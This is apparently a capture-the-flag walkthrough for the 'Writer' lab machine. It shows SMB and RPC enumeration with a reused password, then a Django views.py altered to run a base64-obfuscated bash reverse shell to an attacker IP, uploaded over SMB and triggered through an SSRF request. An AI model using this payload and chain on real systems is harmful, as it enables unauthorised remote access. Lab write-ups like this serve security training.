# Alternative way to exploit Writer

## Reverse Shell for www-data through SMB

After accessing the source code of the web application, the password in _/var/www/writer.htb/writer/\_\_init\_\_.py_ was reused on the SMB service.

Enumerating the SMB shares:
```
smbclient -L //10.10.11.101
```
```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
writer2_project Disk      
IPC$            IPC       IPC Service (writer server (Samba, Ubuntu))
```

Enumerating usernames with **rpcclient**:
```
rpcclient -U '' 10.10.11.101
```
```
rpcclient $> enumdomusers
user:[kyle] rid:[0x3e8]
```

Using the password from the Python web service for the user _kyle_ to enumerate the SMB share _writer2_project_:
```
smbclient -U kyle //10.10.11.101/writer2_project
```
```
smb: \> dir

  static                              D        0  Sun May 16 22:29:16 2021
  staticfiles                         D        0  Fri Jul  9 12:59:42 2021
  writer_web                          D        0  Wed May 19 17:26:18 2021
  requirements.txt                    N       15  Tue Dec 20 17:08:01 2022
  writerv2                            D        0  Wed May 19 14:32:41 2021
  manage.py                           N      806  Tue Dec 20 17:08:01 2022
```

This is a **Python Django** web application, which is configured in the _/etc/apache2/sites-enabled/000-default.conf_ on port 8080, but can only be accessed from localhost:
```
(...)
#<VirtualHost 127.0.0.1:8080>
#       ServerName dev.writer.htb
#       ServerAdmin admin@writer.htb
#
        # Collect static for the writer2_project/writer_web/templates
#       Alias /static /var/www/writer2_project/static
#       <Directory /var/www/writer2_project/static>
(...)
```

Modifying _writer_web/views.py_ to execute a reverse shell:
```python
def home_page(request):
    import os
    os.system("echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNS85MDAxICAwPiYxICAK | base64 -d | bash;")
    template_name = "index.html"
    return render(request,template_name)
```

Uploading the modified _views.py_ to the SMB service:
```
smb: \writer_web\> put views.py
```

A **Server Side Request Forgery (SSRF)** vulnerability in the upload image feature can be used to make a request to the web application on port 8080:
```
POST /dashboard/stories/add HTTP/1.1
(...)

Content-Disposition: form-data; name="image_url"

http://127.0.0.1:8080/?test.jpg
```

After sending the request, it will connect to the service on port 8080 and execute the reverse shell command in _views.py_ to start a shell session as _www-data_.
